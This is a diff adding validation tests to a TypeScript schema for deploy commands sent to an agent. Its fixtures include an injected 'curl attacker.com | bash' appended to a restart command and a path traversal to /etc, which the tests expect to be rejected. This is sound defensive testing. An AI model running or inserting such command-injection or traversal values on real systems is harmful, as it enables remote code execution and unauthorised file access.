@@ -130,6 +130,54 @@ describe('AgentCommandSchema', () => {
     expect(result.success).toBe(false)
   })
 
+  it('rejects deploy command with non-hex commitSha', () => {
+    const result = AgentCommandSchema.safeParse({
+      type: 'deploy',
+      jobId: crypto.randomUUID(),
+      workingDir: '/opt/app',
+      restartCommand: 'systemctl restart app',
+      timeoutSeconds: 300,
+      commitSha: 'G'.repeat(40),
+    })
+    expect(result.success).toBe(false)
+  })
+
+  it('rejects deploy command with shell metacharacter in restartCommand', () => {
+    const result = AgentCommandSchema.safeParse({
+      type: 'deploy',
+      jobId: crypto.randomUUID(),
+      workingDir: '/opt/app',
+      restartCommand: 'systemctl restart app; curl attacker.com | bash',
+      timeoutSeconds: 300,
+      commitSha: 'a'.repeat(40),
+    })
+    expect(result.success).toBe(false)
+  })
+
+  it('rejects deploy command with relative workingDir', () => {
+    const result = AgentCommandSchema.safeParse({
+      type: 'deploy',
+      jobId: crypto.randomUUID(),
+      workingDir: 'opt/app',
+      restartCommand: 'systemctl restart app',
+      timeoutSeconds: 300,
+      commitSha: 'a'.repeat(40),
+    })
+    expect(result.success).toBe(false)
+  })
+
+  it('rejects deploy command with path traversal in workingDir', () => {
+    const result = AgentCommandSchema.safeParse({
+      type: 'deploy',
+      jobId: crypto.randomUUID(),
+      workingDir: '/opt/app/../../etc',
+      restartCommand: 'systemctl restart app',
+      timeoutSeconds: 300,
+      commitSha: 'a'.repeat(40),
+    })
+    expect(result.success).toBe(false)
+  })
+
   it('parses a cancel command', () => {
     const result = AgentCommandSchema.safeParse({
       type: 'cancel',
